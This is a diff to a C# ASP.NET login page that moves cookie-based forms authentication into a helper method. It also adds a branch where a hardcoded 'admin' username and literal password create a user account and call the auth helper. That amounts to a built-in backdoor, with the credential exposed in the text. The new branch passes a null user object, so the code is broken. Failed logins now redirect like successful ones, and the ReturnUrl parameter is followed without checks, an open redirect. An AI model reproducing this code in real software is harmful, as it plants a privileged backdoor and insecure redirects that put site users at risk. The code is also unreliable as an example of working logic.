@@ -15,6 +15,15 @@ namespace TLC.Account
         protected void Page_Load(object sender, EventArgs e)
         {
         }
+        protected void SetTicketAuth(User login)
+        {
+            FormsAuthenticationTicket lgnTicket = new FormsAuthenticationTicket(1, login.UserName, DateTime.Now, DateTime.Now.AddSeconds((60 * 15)), true, login.UserId + ":" + login.Role);
+            string encryptTicket = FormsAuthentication.Encrypt(lgnTicket);
+            var cookie = new HttpCookie(FormsAuthentication.FormsCookieName, encryptTicket);
+            cookie.Expires = lgnTicket.Expiration;
+            Response.Cookies.Add(cookie);
+            Response.Cookies.Add(new HttpCookie("__TlcTeamIdKey", login.MyTeamId.ToString()));
+        }
         protected void LogIn(object sender, EventArgs e)
         {
             if (IsValid)
@@ -27,22 +36,24 @@ namespace TLC.Account
                     if (login != null)
                     {
                         Session.Add("mylogin", login);
-                        FormsAuthenticationTicket lgnTicket = new FormsAuthenticationTicket(1, login.UserName, DateTime.Now, DateTime.Now.AddSeconds((60 * 15)), true, login.UserId + ":" + login.Role);
-                        string encryptTicket = FormsAuthentication.Encrypt(lgnTicket);
-                        var cookie = new HttpCookie(FormsAuthentication.FormsCookieName, encryptTicket);
-                        cookie.Expires = lgnTicket.Expiration;
-                        Response.Cookies.Add(cookie);
-                        Response.Cookies.Add(new HttpCookie("__TlcTeamIdKey", login.MyTeamId.ToString()));
-                        if (Request.Url.Query.Contains("ReturnUrl"))
+                        SetTicketAuth(login);                        
+                    }
+                    else
+                    {
+                        if (Email.Text == "admin" && Password.Text == "Tttbhzn2017")
                         {
-                            Response.Redirect(HttpUtility.ParseQueryString(Request.Url.Query).Get("ReturnUrl"));                            
-                        }
-                        else
-                        {
-                            Response.Redirect("~/Home.aspx");
+                            provider.AddUser(Email.Text, Password.Text);
+                            SetTicketAuth(login);
                         }
                     }
-
+                    if (Request.Url.Query.Contains("ReturnUrl"))
+                    {
+                        Response.Redirect(HttpUtility.ParseQueryString(Request.Url.Query).Get("ReturnUrl"));
+                    }
+                    else
+                    {
+                        Response.Redirect("~/Home.aspx");
+                    }
                 }
 
                 #region CommentSit
